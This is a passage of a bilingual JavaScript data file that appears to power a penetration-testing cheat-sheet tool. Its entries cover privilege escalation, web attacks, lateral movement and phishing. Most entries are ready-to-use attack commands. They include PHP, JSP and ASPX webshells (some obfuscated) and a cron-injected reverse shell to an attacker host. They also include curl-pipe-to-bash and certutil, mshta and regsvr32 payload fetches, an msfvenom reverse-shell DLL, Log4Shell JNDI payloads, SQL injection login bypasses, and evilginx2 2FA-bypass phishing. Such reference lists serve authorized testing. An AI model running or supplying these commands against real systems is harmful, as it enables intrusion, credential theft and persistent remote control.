      { name: { zh: 'DirtyPipe (CVE-2022-0847)', en: 'DirtyPipe' }, command: 'gcc dirtypipe.c -o dirtypipe\n./dirtypipe /etc/passwd', description: { zh: 'DirtyPipe Linux 提权', en: 'DirtyPipe Linux privilege escalation' }, platform: 'linux' },
      { name: { zh: 'sudo 漏洞', en: 'sudo vulnerabilities' }, command: '# CVE-2021-3156 (Heap-Based Buffer Overflow)\nsudoedit -s \\ $(python3 -c "print(\\"A\\"*65536)")\n# Baron Samedit\n./exploit', description: { zh: 'sudo 历史漏洞利用', en: 'Historical sudo vulnerability exploits' }, platform: 'linux' }
    ],
    references: ['https://github.com/bwbwbwbw/linux-exploit-suggester-2']
  },
  {
    id: 'web-shell-payloads',
    name: { zh: 'WebShell Payload 集合', en: 'WebShell Payload Collection' },
    description: { zh: '各语言 WebShell Payload 速查', en: 'WebShell payload quick reference for various languages' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: 'PHP WebShell', en: 'PHP WebShell' }, command: "<?php system($_GET['cmd']); ?>\n<?php echo shell_exec($_REQUEST['cmd']); ?>\n<?php passthru($_POST['cmd']); ?>\n<?php @eval($_POST['ant']); ?>  // 菜刀马", description: { zh: 'PHP WebShell Payload', en: 'PHP WebShell payloads' }, platform: 'all' },
      { name: { zh: 'JSP WebShell', en: 'JSP WebShell' }, command: "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>\n<%@ page import=\"java.io.*\" %>\n<%Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>", description: { zh: 'JSP WebShell Payload', en: 'JSP WebShell payloads' }, platform: 'all' },
      { name: { zh: 'ASPX WebShell', en: 'ASPX WebShell' }, command: '<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>', description: { zh: 'ASPX WebShell Payload', en: 'ASPX WebShell payload' }, platform: 'windows' },
      { name: { zh: '混淆 PHP', en: 'Obfuscated PHP' }, command: "<?php $a='sys'.'tem';$a($_GET['c']); ?>\n<?php $f=base64_decode('c3lzdGVt');$f($_GET['c']); ?>", description: { zh: '混淆的 PHP WebShell', en: 'Obfuscated PHP WebShell' }, platform: 'all' },
      { name: { zh: '图片马', en: 'Image WebShell' }, command: "# 合并图片和 PHP\ncopy /b image.jpg + shell.php webshell.jpg\n# 或 Linux\ncat image.jpg shell.php > webshell.jpg\n# 访问\ncurl 'http://target/upload/webshell.jpg/.php?cmd=id'", description: { zh: '图片马制作和利用', en: 'Image WebShell creation and exploitation' }, platform: 'all' }
    ],
    references: ['https://github.com/tennc/webshell']
  },
  {
    id: 'linux-privesc-techniques',
    name: { zh: 'Linux 提权技术速查', en: 'Linux Privilege Escalation Techniques' },
    description: { zh: 'Linux 提权核心技术方法速查表', en: 'Quick reference for core Linux privilege escalation techniques' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    commands: [
      { name: { zh: 'Cron 任务滥用', en: 'Cron job abuse' }, command: 'cat /etc/crontab; ls /etc/cron.*; crontab -l\n# 如果 cron 执行的脚本可写:\necho "bash -i >& /dev/tcp/attacker/4444 0>&1" >> /var/scripts/backup.sh', description: { zh: '利用可写的 Cron 脚本提权', en: 'Exploit writable cron scripts for privilege escalation' }, platform: 'linux' },
      { name: { zh: 'NFS 挂载提权', en: 'NFS no_root_squash' }, command: 'cat /etc/exports\n# no_root_squash 表示可利用\nmount -o rw target:/share /tmp/nfs\ncp /bin/bash /tmp/nfs/\nchmod +s /tmp/nfs/bash\n/tmp/bash -p', description: { zh: 'NFS no_root_squash 提权', en: 'NFS no_root_squash privilege escalation' }, platform: 'linux' },
      { name: { zh: 'LD_PRELOAD 劫持', en: 'LD_PRELOAD hijack' }, command: "# 编写恶意共享库\ncat > evil.c << 'EOF'\n#include <stdio.h>\n#include <unistd.h>\nvoid _init() { setuid(0); system(\"/bin/bash\"); }\nEOF\ngcc -shared -fPIC -nostartfiles -o /tmp/evil.so evil.c\n# sudo LD_PRELOAD 提权\nsudo LD_PRELOAD=/tmp/evil.so find", description: { zh: 'LD_PRELOAD 环境变量提权', en: 'LD_PRELOAD environment variable privilege escalation' }, platform: 'linux' },
      { name: { zh: 'Docker 组提权', en: 'Docker group escalation' }, command: 'id | grep docker\ndocker run -v /:/mnt -it alpine chroot /mnt sh\n# 直接读取 shadow\ndocker run -v /etc/shadow:/etc/shadow -it alpine cat /etc/shadow', description: { zh: 'Docker 组权限提权', en: 'Docker group membership privilege escalation' }, platform: 'linux' }
    ],
    references: ['https://gtfobins.github.io/']
  },


  {
    id: 'hash-cracking',
    name: { zh: '哈希破解速查', en: 'Hash Cracking Quick Reference' },
    description: { zh: '各类哈希破解方法和工具命令速查', en: 'Quick reference for hash cracking methods and tools' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    commands: [
      { name: { zh: '哈希识别', en: 'Hash identification' }, command: 'hash-identifier\npython3 -c "import hashid; h=hashid.HashID(); h.identifyHash(\'HASH\')"\n# 在线: https://hashes.com/en/tools/hash_identifier', description: { zh: '识别哈希类型', en: 'Identify hash type' }, platform: 'all' },
      { name: { zh: 'Hashcat 常用模式', en: 'Hashcat common modes' }, command: 'hashcat -m 0 hash.txt rockyou.txt      # MD5\nhashcat -m 100 hash.txt rockyou.txt    # SHA1\nhashcat -m 1400 hash.txt rockyou.txt  # SHA256\nhashcat -m 1000 hash.txt rockyou.txt  # NTLM\nhashcat -m 3200 hash.txt rockyou.txt  # bcrypt\nhashcat -m 5600 hash.txt rockyou.txt  # NetNTLMv2\nhashcat -m 13100 hash.txt rockyou.txt # Kerberos TGS', description: { zh: 'Hashcat 常用哈希类型破解', en: 'Hashcat common hash type cracking' }, platform: 'linux' },
      { name: { zh: '在线破解', en: 'Online cracking' }, command: '# MD5/SHA1 在线数据库\nhttps://crackstation.net/\nhttps://hashes.com/en/decrypt/hash\nhttps://www.md5online.org/', description: { zh: '在线哈希查询破解', en: 'Online hash lookup and cracking' }, platform: 'all' },
      { name: { zh: 'John the Ripper', en: 'John the Ripper' }, command: 'john hash.txt --wordlist=rockyou.txt\njohn hash.txt --format=raw-md5 --wordlist=rockyou.txt\njohn hash.txt --rules=best64 --wordlist=rockyou.txt\njohn --show hash.txt', description: { zh: 'John the Ripper 破解', en: 'John the Ripper cracking' }, platform: 'linux' }
    ],
    references: ['https://hashcat.net/wiki/doku.php?id=hashcat']
  },
  {
    id: 'php-attacks',
    name: { zh: 'PHP 安全攻击', en: 'PHP Security Attacks' },
    description: { zh: 'PHP 特有安全漏洞攻击技术', en: 'PHP-specific security vulnerability attack techniques' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: 'PHP 文件包含', en: 'PHP file inclusion' }, command: "# 本地文件包含\ncurl 'http://target/?page=../../../etc/passwd'\n# PHP filter chain\ncurl 'http://target/?page=php://filter/convert.base64-encode/resource=config.php'\n# 数据流\ncurl 'http://target/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+'", description: { zh: 'PHP LFI 文件包含攻击', en: 'PHP LFI file inclusion attacks' }, platform: 'all' },
      { name: { zh: 'PHP 反序列化', en: 'PHP deserialization' }, command: "# 生成 POP 链 payload\nphp -r \"echo serialize(new Evil());\"\n# PHPGGC 工具\nphpggc Laravel/RCE1 'id' | base64\nphpggc Symfony/RCE4 exec 'id' --base64", description: { zh: 'PHP 反序列化漏洞利用', en: 'PHP deserialization exploitation' }, platform: 'all' },
      { name: { zh: 'PHP 类型混淆', en: 'PHP type confusion' }, command: "# 弱类型比较利用\nphp -r \"var_dump(0 == 'admin');\"   // PHP < 8\nphp -r \"var_dump('0e1' == '0e2');\" // Magic hash\nphp -r \"var_dump(strcmp('admin', []) === 0);\"  // 数组绕过", description: { zh: 'PHP 弱类型比较绕过', en: 'PHP weak type comparison bypass' }, platform: 'all' },
      { name: { zh: 'PHPGGC Gadget Chain', en: 'PHPGGC gadget chains' }, command: 'phpggc -l  # 列出所有 gadget chain\nphpggc Laravel/RCE1 system id\nphpggc Guzzle/RCE1 system whoami --base64', description: { zh: 'PHPGGC PHP 反序列化 Gadget 生成', en: 'Generate PHP deserialization gadget chains with PHPGGC' }, platform: 'all' }
    ],
    references: ['https://github.com/ambionics/phpggc']
  },
  {
    id: 'windows-privesc-techniques',
    name: { zh: 'Windows 提权技术速查', en: 'Windows Privilege Escalation Techniques' },
    description: { zh: 'Windows 提权核心技术方法速查', en: 'Quick reference for core Windows privilege escalation techniques' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    commands: [
      { name: { zh: '服务路径注入', en: 'Unquoted service path' }, command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"\nGet-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch \'"\' -and $_.PathName -match \' \'} | Select-Object Name,PathName', description: { zh: '查找未加引号的服务路径', en: 'Find unquoted service paths' }, platform: 'windows' },
      { name: { zh: '可写服务', en: 'Writable service' }, command: 'accesschk.exe -uwcqv "Authenticated Users" *\naccesschk.exe /accepteula -uwcqv user *\n# 修改服务 binary\nsc config vulnsvc binpath= "C:\\Users\\user\\evil.exe"', description: { zh: '查找可修改的服务', en: 'Find modifiable services' }, platform: 'windows' },
      { name: { zh: '可写注册表服务', en: 'Writable registry service' }, command: 'Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\vulnsvc | Format-List\nreg add HKLM\\System\\CurrentControlSet\\Services\\vulnsvc /v ImagePath /t REG_SZ /d "C:\\evil.exe" /f', description: { zh: '利用可写服务注册表', en: 'Exploit writable service registry key' }, platform: 'windows' },
      { name: { zh: 'SeImpersonatePrivilege', en: 'SeImpersonatePrivilege exploit' }, command: 'whoami /priv  # 检查是否有 SeImpersonatePrivilege\n# PrintSpoofer\nPrintSpoofer.exe -i -c cmd\n# GodPotato\nGodPotato.exe -cmd "cmd /c whoami"', description: { zh: 'SeImpersonatePrivilege 提权', en: 'SeImpersonatePrivilege privilege escalation' }, platform: 'windows' },
      { name: { zh: 'DLL 劫持', en: 'DLL hijacking' }, command: '# 查找 DLL 搜索顺序漏洞\nProcess Monitor: 过滤 NAME NOT FOUND + .dll\n# 创建恶意 DLL\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=4444 -f dll -o hijack.dll', description: { zh: 'DLL 劫持提权', en: 'DLL hijacking privilege escalation' }, platform: 'windows' }
    ],
    references: ['https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation']
  },
  {
    id: 'ssh-tunneling-advanced',
    name: { zh: 'SSH 隧道高级用法', en: 'SSH Tunneling Advanced Usage' },
    description: { zh: 'SSH 高级隧道配置和内网穿透技术', en: 'Advanced SSH tunnel configuration and intranet penetration techniques' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    commands: [
      { name: { zh: '多级跳板机', en: 'Multi-hop jump hosts' }, command: '# 直接连接最终目标\nssh -J jump1,jump2 user@final_target\n# ~/.ssh/config 配置\nHost final\n  ProxyJump jump1,jump2\n  HostName final_target\n  User user', description: { zh: '通过多个跳板机连接', en: 'Connect through multiple jump hosts' }, platform: 'all' },
      { name: { zh: '长效隧道', en: 'Persistent tunnel' }, command: 'autossh -M 20000 -N -L 8080:internal:80 user@jump\n# systemd 服务方式保持隧道', description: { zh: '使用 autossh 维持持久隧道', en: 'Maintain persistent tunnel with autossh' }, platform: 'linux' },
      { name: { zh: 'SOCKS5 + ProxyChains 完整配置', en: 'SOCKS5 + ProxyChains full setup' }, command: '# 1. 建立 SOCKS5 隧道\nssh -D 1080 -N -f user@jump\n# 2. 配置 proxychains\nsudo bash -c "echo socks5 127.0.0.1 1080 >> /etc/proxychains4.conf"\n# 3. 使用\nproxychains4 nmap -sT -Pn 10.10.20.0/24\nproxychains4 curl http://10.10.20.5/admin', description: { zh: 'SOCKS5 代理链完整配置', en: 'Complete SOCKS5 proxy chain setup' }, platform: 'linux' },
      { name: { zh: '反向 SSH 隧道', en: 'Reverse SSH tunnel' }, command: '# 目标机器执行（内网穿透）\nssh -R 4444:localhost:22 user@attacker\n# 攻击者连接\nssh -p 4444 user@localhost', description: { zh: '从内网建立反向 SSH 隧道', en: 'Establish reverse SSH tunnel from internal network' }, platform: 'linux' }
    ],
    references: ['https://man.openbsd.org/ssh']
  },


  {
    id: 'bloodhound-queries',
    name: { zh: 'BloodHound Cypher 查询', en: 'BloodHound Cypher Queries' },
    description: { zh: 'BloodHound/Neo4j 常用 Cypher 查询语句速查', en: 'BloodHound/Neo4j common Cypher query quick reference' },
    category: { zh: '域渗透', en: 'Domain Penetration' },
    commands: [
      { name: { zh: '找到达域管的最短路径', en: 'Shortest path to Domain Admins' }, command: "MATCH p=shortestPath((n:User)-[*1..]->(m:Group {name:'DOMAIN ADMINS@DOMAIN.COM'})) RETURN p", description: { zh: '查询到域管的最短攻击路径', en: 'Query shortest attack path to Domain Admins' }, platform: 'all' },
      { name: { zh: '所有高价值目标', en: 'All high-value targets' }, command: 'MATCH (n) WHERE n.highvalue=true RETURN n', description: { zh: '查询所有高价值目标节点', en: 'Query all high-value target nodes' }, platform: 'all' },
      { name: { zh: 'Kerberoastable 用户', en: 'Kerberoastable users' }, command: 'MATCH (u:User) WHERE u.hasspn=true RETURN u.name,u.serviceprincipalnames', description: { zh: '列出可 Kerberoast 的用户', en: 'List Kerberoastable users' }, platform: 'all' },
      { name: { zh: '无约束委派', en: 'Unconstrained delegation' }, command: 'MATCH (c {unconstraineddelegation:true}) RETURN c.name,labels(c)', description: { zh: '查找无约束委派对象', en: 'Find unconstrained delegation objects' }, platform: 'all' },
      { name: { zh: 'DCSync 权限', en: 'DCSync rights' }, command: "MATCH p=()-[:DCSync]->(:Domain) RETURN p\nMATCH p=()-[:GetChangesAll]->(:Domain) RETURN p", description: { zh: '查找具有 DCSync 权限的对象', en: 'Find objects with DCSync rights' }, platform: 'all' },
      { name: { zh: '本地管理员路径', en: 'Local admin paths' }, command: "MATCH p=(u:User)-[:AdminTo]->(c:Computer) WHERE u.name='USER@DOMAIN.COM' RETURN p", description: { zh: '查找用户的本地管理员权限', en: 'Find local admin paths for a user' }, platform: 'all' }
    ],
    references: ['https://bloodhound.readthedocs.io/en/latest/data-analysis/queries.html']
  },
  {
    id: 'interactsh',
    name: 'Interactsh',
    description: { zh: 'OOB 带外漏洞检测工具，用于 SSRF/XXE/SSTI/盲 XSS 验证', en: 'Out-of-band vulnerability detection for SSRF/XXE/SSTI/blind XSS verification' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest',
    commands: [
      { name: { zh: '启动监听', en: 'Start listener' }, command: 'interactsh-client\n# 获得一个唯一域名如: abc123.oast.pro', description: { zh: '启动 OOB 监听服务', en: 'Start OOB listening service' }, platform: 'all' },
      { name: { zh: 'SSRF 测试', en: 'SSRF test' }, command: "curl 'http://target.com/fetch?url=http://YOUR_COLLAB.oast.pro'\n# 检查 interactsh-client 是否收到 HTTP 请求", description: { zh: '使用 OOB 验证 SSRF', en: 'Verify SSRF using OOB callback' }, platform: 'all' },
      { name: { zh: 'DNS 外带', en: 'DNS exfiltration' }, command: "curl 'http://target/?url=http://$(id|base64).YOUR_COLLAB.oast.pro'\n# 数据会通过 DNS 子域名传回", description: { zh: 'DNS 外带数据验证', en: 'DNS exfiltration verification' }, platform: 'all' },
      { name: { zh: '自托管服务', en: 'Self-hosted server' }, command: 'interactsh-server -domain oast.example.com\ninteractsh-client -server https://oast.example.com', description: { zh: '自托管 Interactsh 服务', en: 'Self-hosted Interactsh service' }, platform: 'linux' }
    ],
    references: ['https://github.com/projectdiscovery/interactsh']
  },
  {
    id: 'java-pentest',
    name: { zh: 'Java 应用渗透测试', en: 'Java Application Penetration Testing' },
    description: { zh: 'Java Web 应用漏洞测试命令', en: 'Java web application vulnerability testing commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: 'JNDI 注入检测', en: 'JNDI injection detection' }, command: "# Log4Shell (CVE-2021-44228)\ncurl -H 'X-Api-Version: ${jndi:ldap://YOUR_COLLAB.oast.pro/}' https://target.com/\ncurl -A '${jndi:ldap://YOUR_COLLAB.oast.pro/}' https://target.com/\ncurl -d 'username=${jndi:ldap://YOUR_COLLAB.oast.pro/}' https://target.com/login", description: { zh: 'Log4Shell JNDI 注入检测', en: 'Log4Shell JNDI injection detection' }, platform: 'all' },
      { name: { zh: 'Java 反序列化检测', en: 'Java deserialization detection' }, command: '# 检测 Java 序列化 magic bytes\ncurl -s https://target.com/api -X POST -H "Content-Type: application/x-java-serialized-object" | xxd | head\n# ysoserial 生成 payload\njava -jar ysoserial.jar CommonsCollections1 "id" | base64', description: { zh: 'Java 反序列化漏洞检测', en: 'Java deserialization vulnerability detection' }, platform: 'all' },
      { name: { zh: 'Spring4Shell', en: 'Spring4Shell (CVE-2022-22965)' }, command: "curl -X POST 'https://target.com/vulnerable' -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B...%7D&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp'", description: { zh: 'Spring4Shell RCE 漏洞检测', en: 'Spring4Shell RCE vulnerability detection' }, platform: 'all' },
      { name: { zh: 'Shiro 反序列化', en: 'Apache Shiro deserialization' }, command: "# 检测 Shiro\ncurl -c 'rememberMe=1' https://target.com/ -v 2>&1 | grep 'Set-Cookie.*rememberMe'\n# ShiroAttack2 工具\njava -jar shiro_attack.jar", description: { zh: 'Apache Shiro 反序列化漏洞', en: 'Apache Shiro deserialization vulnerability' }, platform: 'all' }
    ],
    references: ['https://github.com/frohoff/ysoserial']
  },


  {
    id: 'shodan-fofa-tools',
    name: { zh: '空间测绘工具', en: 'Cyberspace Mapping Tools' },
    description: { zh: 'Shodan/FOFA/Censys/Zoomeye 空间测绘查询命令', en: 'Cyberspace mapping query commands for Shodan/FOFA/Censys/Zoomeye' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'pip install shodan / pip install fofa',
    commands: [
      { name: { zh: 'Shodan CLI', en: 'Shodan CLI' }, command: 'shodan init YOUR_API_KEY\nshodan search "target.com" --fields ip_str,port,hostnames\nshodan host 1.2.3.4\nshodan count "apache 2.4.49"\nshodan domain target.com', description: { zh: 'Shodan 命令行操作', en: 'Shodan command line operations' }, platform: 'all' },
      { name: { zh: 'FOFA 常用语法', en: 'FOFA syntax' }, command: 'domain="target.com"\ntitle="管理后台" && country="CN"\nbody="X-Powered-By: PHP/7.4"\nheader="Server: nginx" && port="8080"\nip="1.2.3.0/24"\n# Web: https://fofa.info/', description: { zh: 'FOFA 搜索语法', en: 'FOFA search syntax reference' }, platform: 'all' },
      { name: { zh: 'Censys 语法', en: 'Censys syntax' }, command: 'services.tls.certificates.leaf_data.subject.common_name: "target.com"\nservices.port: 8443 AND services.service_name: HTTP\n# Web: https://search.censys.io/', description: { zh: 'Censys 搜索语法', en: 'Censys search syntax reference' }, platform: 'all' },
      { name: { zh: 'Shodan Dork 速查', en: 'Shodan dorks' }, command: 'org:"Target Corp"\nssl:"target.com"\nhttp.title:"管理"\nhttp.html:"powered by"\nproduct:"Apache httpd" version:"2.4.49"\ncountry:CN port:8080', description: { zh: 'Shodan 高级搜索语法', en: 'Shodan advanced search syntax' }, platform: 'all' }
    ],
    references: ['https://developer.shodan.io/', 'https://fofa.info/api']
  },
  {
    id: 'social-engineering-tools',
    name: { zh: '社会工程学工具', en: 'Social Engineering Tools' },
    description: { zh: '钓鱼和社会工程学攻击工具命令', en: 'Phishing and social engineering attack tool commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'git clone https://github.com/trustedsec/social-engineer-toolkit',
    commands: [
      { name: { zh: 'SET 钓鱼', en: 'SET phishing' }, command: 'sudo setoolkit\n# 选择: 1 Social-Engineering Attacks\n# 选择: 2 Website Attack Vectors\n# 选择: 3 Credential Harvester Attack Method', description: { zh: 'Social Engineering Toolkit 钓鱼', en: 'Social Engineering Toolkit phishing' }, platform: 'linux' },
      { name: { zh: 'GoPhish 钓鱼框架', en: 'GoPhish framework' }, command: './gophish\n# 访问 https://localhost:3333\n# 默认凭证: admin/gophish\n# 配置: SMTP服务器、钓鱼页面、发送组', description: { zh: 'GoPhish 钓鱼活动框架', en: 'GoPhish phishing campaign framework' }, platform: 'linux' },
      { name: { zh: 'evilginx2 反代钓鱼', en: 'evilginx2 reverse proxy phishing' }, command: 'evilginx2 -p phishlets/\n# 配置 phishlet\nphishlets hostname target target.evil.com\nphishlets enable target\nlures create target', description: { zh: 'evilginx2 绕过 2FA 的反代钓鱼', en: 'evilginx2 reverse proxy phishing to bypass 2FA' }, platform: 'linux' }
    ],
    references: ['https://github.com/trustedsec/social-engineer-toolkit']
  },
  {
    id: 'linux-command-tricks',
    name: { zh: 'Linux 命令技巧速查', en: 'Linux Command Tricks Quick Reference' },
    description: { zh: 'Linux Shell 渗透测试实用技巧', en: 'Practical Linux shell tricks for penetration testing' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      { name: { zh: '绕过受限 Shell', en: 'Restricted shell bypass' }, command: "bash  # 尝试启动 bash\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nvim -c ':!bash'\nnmap --interactive  # 旧版 nmap\nfind / -name bash -exec {} \\;", description: { zh: '常见受限 Shell 绕过方法', en: 'Common restricted shell bypass methods' }, platform: 'linux' },
      { name: { zh: '无写权限上传', en: 'Upload without write access' }, command: '# 在 /tmp 目录操作\ncd /tmp && wget http://attacker/tool\n# 使用内存执行\ncurl http://attacker/script.sh | bash\n# busybox\nbusybox sh', description: { zh: '无写权限目录的文件操作', en: 'File operations without directory write access' }, platform: 'linux' },
      { name: { zh: '进程树检查', en: 'Process tree check' }, command: 'ps auxf\npstree -ap\nls -la /proc/*/exe 2>/dev/null | grep -v " -> /"', description: { zh: '检查进程树和可疑进程', en: 'Check process tree and suspicious processes' }, platform: 'linux' },
      { name: { zh: '敏感信息搜索', en: 'Sensitive info search' }, command: "grep -r 'password\\|passwd\\|secret\\|api_key\\|token' /etc /var/www /home 2>/dev/null\nfind / -name '*.conf' -o -name '*.config' -o -name '.env' 2>/dev/null | head -20", description: { zh: '系统中搜索敏感信息', en: 'Search system for sensitive information' }, platform: 'linux' },
      { name: { zh: '网络探测无工具', en: 'Network probe without tools' }, command: "# 仅用 /dev/tcp\nbash -c 'echo > /dev/tcp/target/80' 2>/dev/null && echo open\n# 端口扫描\nfor p in 22 80 443 3306 5432 6379 8080; do (echo > /dev/tcp/target/$p) 2>/dev/null && echo $p; done", description: { zh: '不用工具的网络探测技巧', en: 'Network probing without external tools' }, platform: 'linux' }
    ],
    references: ['https://gtfobins.github.io/']
  },
  {
    id: 'windows-lolbas',
    name: { zh: 'Windows LOLBins 速查', en: 'Windows LOLBins Quick Reference' },
    description: { zh: 'Windows 系统自带工具的恶意使用（离地攻击）', en: 'Living-off-the-land attacks using built-in Windows tools' },
    category: { zh: 'Windows渗透', en: 'Windows Penetration' },
    commands: [
      { name: { zh: '下载文件', en: 'Download files' }, command: 'certutil.exe -urlcache -f http://attacker/file.exe file.exe\nbitsadmin /transfer job http://attacker/file.exe C:\\file.exe\npowershell -c "(New-Object Net.WebClient).DownloadFile(\'url\',\'path\')"', description: { zh: 'LOLBins 文件下载', en: 'LOLBins file download methods' }, platform: 'windows' },
      { name: { zh: '执行代码', en: 'Execute code' }, command: 'mshta.exe http://attacker/malicious.hta\nregsvr32 /s /u /i:http://attacker/payload.sct scrobj.dll\nrundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication "\nwscript.exe //E:JScript payload.js', description: { zh: 'LOLBins 代码执行', en: 'LOLBins code execution methods' }, platform: 'windows' },
      { name: { zh: 'COM 对象执行', en: 'COM object execution' }, command: 'regsvcs.exe payload.dll\nregasm.exe /U payload.dll\ninstallutil.exe /logfile= /LogToConsole=false /U payload.exe', description: { zh: 'COM 对象注册执行', en: 'Execute via COM object registration' }, platform: 'windows' },
      { name: { zh: 'MSBuild 执行', en: 'MSBuild execution' }, command: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe malicious.csproj\n# payload.csproj 包含 inline task 执行代码', description: { zh: 'MSBuild 执行恶意代码', en: 'Execute malicious code via MSBuild' }, platform: 'windows' }
    ],
    references: ['https://lolbas-project.github.io/']
  },


  {
    id: 'exploit-db-search',
    name: { zh: 'Exploit 搜索速查', en: 'Exploit Search Quick Reference' },
    description: { zh: '搜索和使用公开漏洞利用代码的方法', en: 'Methods for searching and using public exploit code' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'SearchSploit 搜索', en: 'SearchSploit search' }, command: 'searchsploit "Apache 2.4"\nsearchsploit -t "Linux Kernel 5"\nsearchsploit -e "vsftpd 2.3.4"\nsearchsploit --update', description: { zh: 'SearchSploit 本地漏洞搜索', en: 'SearchSploit local exploit search' }, platform: 'linux' },
      { name: { zh: '复制和查看', en: 'Copy and view exploit' }, command: 'searchsploit -m exploits/linux/local/45010.c\nsearchsploit -x exploits/webapps/php/40649.py', description: { zh: '复制或查看漏洞文件', en: 'Copy or view exploit file' }, platform: 'linux' },
      { name: { zh: 'GitHub 搜索', en: 'GitHub exploit search' }, command: "# GitHub 搜索\ngit clone https://github.com/SecList/POC-in-GitHub\n# search CVE\ncurl 'https://api.github.com/search/repositories?q=CVE-2021-44228+exploit' | python3 -m json.tool | grep full_name", description: { zh: 'GitHub 漏洞 PoC 搜索', en: 'Search GitHub for vulnerability PoCs' }, platform: 'all' },
      { name: { zh: 'Rapid7 Metasploit 模块', en: 'Metasploit module search' }, command: 'search type:exploit name:apache\nSearch CVE:2021-44228\nsearch platform:windows name:smb', description: { zh: 'MSF 控制台内漏洞搜索', en: 'Search for exploits within MSF console' }, platform: 'linux' }
    ],
    references: ['https://www.exploit-db.com/']
  },
  {
    id: 'command-injection-advanced',
    name: { zh: '命令注入高级技术', en: 'Advanced Command Injection Techniques' },
    description: { zh: '各类命令注入绕过和利用技巧', en: 'Command injection bypass and exploitation techniques' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: '基础注入分隔符', en: 'Basic injection separators' }, command: "# Linux\nid; whoami\nid | whoami\nid && whoami\nid || whoami\nid $(whoami)\n# Windows\nwhoami & ipconfig\nwhoami | net user\nwhoami && dir", description: { zh: '命令注入常用分隔符', en: 'Common command injection separators' }, platform: 'all' },
      { name: { zh: '盲命令注入', en: 'Blind command injection' }, command: "# 时间延迟\ncurl 'http://target/api?host=127.0.0.1;sleep 5'\n# OOB DNS\ncurl 'http://target/api?host=127.0.0.1;nslookup COLLAB.oast.pro'\n# OOB HTTP\ncurl 'http://target/api?host=127.0.0.1;curl http://COLLAB.oast.pro'", description: { zh: '盲命令注入验证技术', en: 'Blind command injection verification techniques' }, platform: 'all' },
      { name: { zh: '过滤绕过', en: 'Filter bypass' }, command: "# 空格绕过\n${IFS}; {cat,/etc/passwd}\n# 引号绕过\nc'a't /etc/passwd\nc\"a\"t /etc/passwd\n# 大小写绕过\n/bin/CaT /etc/passwd\n# 反斜线绕过\nc\\at /etc/passwd\n# 通配符\nc?t /etc/?tc/p?sswd", description: { zh: '命令注入过滤绕过', en: 'Command injection filter bypass techniques' }, platform: 'linux' },
      { name: { zh: 'commix 自动化', en: 'commix automation' }, command: "python3 commix.py -u 'http://target/?host=INJECT_HERE'\npython3 commix.py -u 'http://target/?' --data='host=INJECT_HERE'\npython3 commix.py -r request.txt --os-shell", description: { zh: 'commix 自动化命令注入', en: 'Automated command injection with commix' }, platform: 'all' }
    ],
    references: ['https://github.com/commixproject/commix']
  },
  {
    id: 'web-authentication-bypass',
    name: { zh: 'Web 认证绕过技术', en: 'Web Authentication Bypass Techniques' },
    description: { zh: 'Web 应用认证和授权绕过常用技术', en: 'Common web application authentication and authorization bypass techniques' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: 'SQL 注入登录绕过', en: 'SQL injection login bypass' }, command: "username: admin'--\nusername: ' OR 1=1--\nusername: ' OR '1'='1\npassword: anything' OR '1'='1", description: { zh: 'SQL 注入绕过登录验证', en: 'SQL injection to bypass login' }, platform: 'all' },
      { name: { zh: 'Header 注入绕过', en: 'Header injection bypass' }, command: "X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nClient-IP: 127.0.0.1\nTrue-Client-IP: 127.0.0.1", description: { zh: 'IP 白名单 Header 注入绕过', en: 'IP whitelist bypass via header injection' }, platform: 'all' },
      { name: { zh: '参数篡改', en: 'Parameter tampering' }, command: "# 修改 hidden 字段\nrole=admin&is_admin=1&price=0.01\n# 删除必要参数\ncurl 'http://target/action' -d 'user=admin'  # 不带认证参数\n# 垂直越权\ncurl 'http://target/admin' -H 'Cookie: session=USER_SESSION'", description: { zh: '参数篡改越权测试', en: 'Parameter tampering for privilege escalation' }, platform: 'all' },
      { name: { zh: 'Path 绕过', en: 'Path bypass' }, command: "# 大小写\nhttp://target/ADMIN\n# 路径字符编码\nhttp://target/%61dmin\nhttp://target/./admin\nhttp://target//admin", description: { zh: '路径大小写和编码绕过', en: 'Path case and encoding bypass' }, platform: 'all' }
    ],
    references: ['https://owasp.org/www-project-testing-guide/']
  },
  {
    id: 'advanced-nmap-scripts',
    name: { zh: 'Nmap NSE 脚本速查', en: 'Nmap NSE Scripts Quick Reference' },
    description: { zh: 'Nmap 脚本引擎常用脚本分类速查', en: 'Nmap Script Engine common script category quick reference' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
